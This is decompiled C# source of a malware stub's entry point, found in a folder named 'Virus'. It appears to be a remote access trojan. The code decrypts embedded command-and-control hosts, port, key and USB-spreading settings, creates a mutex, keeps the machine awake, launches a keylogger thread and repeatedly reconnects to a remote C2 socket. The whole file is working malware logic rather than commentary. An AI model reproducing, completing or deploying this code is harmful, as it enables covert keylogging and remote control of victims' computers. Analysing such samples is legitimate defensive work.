// Decompiled with JetBrains decompiler
// Type: Stub.Main
// Assembly: DesignV3Sv, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FCAC0DD-9A5C-4DA4-BFB3-EE6355E60533
// Assembly location: C:\Users\hadesker\Desktop\Virus\DesignV\DesignV3Sv.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Threading;

#nullable disable
namespace Stub
{
  public class Main
  {
    [STAThread]
    public static void Main()
    {
      Thread.Sleep(checked (Settings.Sleep * 1000));
      try
      {
        Settings.Hosts = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Hosts));
        Settings.Port = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Port));
        Settings.KEY = Conversions.ToString(AlgorithmAES.Decrypt(Settings.KEY));
        Settings.SPL = Conversions.ToString(AlgorithmAES.Decrypt(Settings.SPL));
        Settings.Groub = Conversions.ToString(AlgorithmAES.Decrypt(Settings.Groub));
        Settings.USBNM = Conversions.ToString(AlgorithmAES.Decrypt(Settings.USBNM));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Environment.Exit(0);
        ProjectData.ClearProjectError();
      }
      if (!Helper.CreateMutex())
        Environment.Exit(0);
      Helper.PreventSleep();
      new Thread((ThreadStart) (() => XLogger.callk())).Start();
      Thread thread1 = new Thread((ThreadStart) (() => Helper.LastAct()));
      Thread thread2 = new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          Thread.Sleep(new Random().Next(3000, 10000));
          if (!ClientSocket.isConnected)
          {
            ClientSocket.isDisconnected();
            ClientSocket.BeginConnect();
          }
          ClientSocket.allDone.WaitOne();
        }
      }));
      thread1.Start();
      thread2.Start();
      thread2.Join();
    }
  }
}
